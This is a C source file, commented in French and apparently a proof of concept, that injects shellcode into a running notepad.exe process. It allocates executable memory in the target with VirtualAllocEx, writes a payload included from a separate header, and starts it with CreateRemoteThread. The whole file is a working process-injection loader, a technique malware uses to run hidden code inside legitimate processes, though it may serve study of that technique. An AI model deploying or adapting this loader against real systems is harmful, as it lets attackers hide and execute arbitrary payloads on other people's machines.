#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>
#include "payload.h"

int injectProc(int PID){
    int is64 = 0;

    PUCHAR shellcode = (PUCHAR)&payload_bin;
    SIZE_T scSize = payload_bin_len;
    // PROCESS_ALL_ACCESS -> on va lui trituré les intestins
    // FALSE -> on va pas créer de process child
    // le PID du process cible
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, PID);

    // MEM_RESERVE -> Reserve un pool d'addr virtuel (Create VAD)
    // MEM_COMMIT -> Selon la taille alloué, pour chaque page 
    //                   -> Alloue une frame physique
    //                   -> Renseigne un PTE (Présent = 1 + (RX + RW)->(PAGE_EXECUTE_READWRITE))
    //                   -> Met à jour le VAD avec les info renseigné + Flush TLB (Translation Look-aside Buffer - Cache processeur pour les pages déjà lus)
    LPVOID memPoolPtr = VirtualAllocEx(hProcess, NULL, scSize, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
    if (memPoolPtr == NULL) {
	    printf("VirtualAllocEx failed: %ul\n", GetLastError());
	    return 1;
    }
    printf("[+] Mem page allocated at: 0x%p\n", memPoolPtr);
    WriteProcessMemory(hProcess, memPoolPtr, shellcode, scSize, NULL);
    printf("[+] Shellcode %s written\n", is64 ? "64bit" : "32bit");

    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)memPoolPtr, NULL, 0, NULL);
    if (hThread == NULL) {
        printf("CreateRemoteThread failed : %ul\n", GetLastError());
        return 1;
    }
    printf("[+] Remote thread created.\n");
    printf("[+] Waiting for thread.\n");
    WaitForSingleObject(hThread, INFINITE);
    printf("[+] Sehellcode done.\n");

    VirtualFreeEx(hProcess, memPoolPtr, 0, MEM_RELEASE);
    CloseHandle(hThread);
    CloseHandle(hProcess);

    return 0;
}

int getPID(){
    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32);
    int pid = 0;

    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    Process32First(snapshot, &pe32);

    do {
        if (!strcmp("notepad.exe", pe32.szExeFile)) {
            printf("[PID: %u] %s\n", pe32.th32ProcessID, pe32.szExeFile);
            pid = pe32.th32ProcessID;
            break;
        }
    } while (Process32Next(snapshot, &pe32));

    CloseHandle(snapshot);
    return pid;
}

int main(int argc, char **argv){
    int pid = getPID();
    if (!pid) {
        printf("[-] this POC works only on notepad.exe, start one instance to inject.");
        return 1;
    }

    return injectProc(pid);
}